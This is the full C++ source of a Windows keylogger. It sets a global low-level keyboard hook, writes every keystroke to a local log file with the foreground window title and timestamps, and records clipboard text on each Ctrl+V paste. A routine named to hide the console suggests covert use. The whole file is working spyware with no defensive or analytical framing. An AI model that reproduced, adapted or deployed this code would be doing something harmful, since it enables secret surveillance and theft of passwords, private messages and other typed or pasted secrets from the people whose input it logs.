#include <Windows.h>
#include <iostream>
#include <fstream>
#include <ctime>

#define OUTPUT_FILENAME "keylogger.log"
std::wofstream output_file(OUTPUT_FILENAME, std::ios::app);

void HideConsole();

HHOOK hook;
void CreateHook();
void RemoveHook();
LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam);

static char lastWindowTitle[256] = "";
void CheckWindowChange();

void getClipboardContent();
void SaveLogs(KBDLLHOOKSTRUCT kbd);


int main() {
    HideConsole();
    CreateHook(); std::atexit(RemoveHook);

    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0))
        Sleep(10);

    return EXIT_SUCCESS;
}


/// To hide the console
void HideConsole() { ShowWindow(FindWindowA("ConsoleWindowClass", NULL), SW_NORMAL); }

/// Create a hook
void CreateHook() { hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) HookCallback, NULL, 0); }

/// Remove the hook
void RemoveHook() { UnhookWindowsHookEx(hook); }

/// Callback function for the hook
LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if(nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        KBDLLHOOKSTRUCT kbd = *(KBDLLHOOKSTRUCT*) lParam;
        CheckWindowChange();
        SaveLogs(kbd);
    }
    return CallNextHookEx(0, nCode, wParam, lParam);
}

/// Check if the foreground window has changed
void CheckWindowChange() {
    HWND foregroundWindow = GetForegroundWindow();
    char foregroundWindowTitle[256];
    GetWindowTextA(foregroundWindow, (LPSTR) foregroundWindowTitle, 256);

    if(strcmp(lastWindowTitle, foregroundWindowTitle)) {
        time_t rawTime; struct tm* timeInfo;
        char buffer[80];

        time(&rawTime);
        timeInfo = localtime(&rawTime);
        strftime(buffer, sizeof(buffer), "%H:%M:%S  - %B %d, %Y", timeInfo);

        strcpy(lastWindowTitle, foregroundWindowTitle);
        output_file << std::endl << std::endl << "[ " << foregroundWindowTitle << " ]   " << buffer << std::endl;
    }
}

/// Save logs into a file
void SaveLogs(KBDLLHOOKSTRUCT kbd) {
    BYTE keysState[256] = { 0 };
    wchar_t buffer[10] = { 0 };

    GetKeyState(VK_SHIFT); GetKeyState(VK_MENU);
    GetKeyboardState((PBYTE) &keysState);

    if(!(MapVirtualKey(kbd.vkCode, 2) >> (sizeof(UINT)*8-1) & 1))
        ToUnicode(kbd.vkCode, kbd.scanCode, (PBYTE) &keysState, (LPWSTR) &buffer, sizeof(buffer)/sizeof(*buffer) -1, 0);

    if(GetKeyState(VK_CONTROL) & 0x8000) {
        if(kbd.vkCode == 0x56) getClipboardContent();
    }

    else {
        switch(kbd.vkCode) {
        case VK_RETURN:
            output_file << std::endl;
            break;

        case VK_TAB:
            output_file << L"[TAB]";
            break;

        case VK_BACK:
            output_file << L"[BACK]";
            break;

        case VK_DELETE:
            output_file << L"[DEL]";
            break;

        default:
            output_file << buffer;
        }
    }
    output_file.flush();
}

/// Get the clipboard content
void getClipboardContent() {
    if(OpenClipboard(NULL)) {
        HANDLE hData = GetClipboardData(CF_TEXT);
        if(hData) {
            char* clipboard = static_cast<char*> (GlobalLock(hData));
            if(clipboard)
                output_file << "[CTRL V: " << clipboard << "]";

            GlobalUnlock(hData);
        }
    }
    CloseClipboard();
}
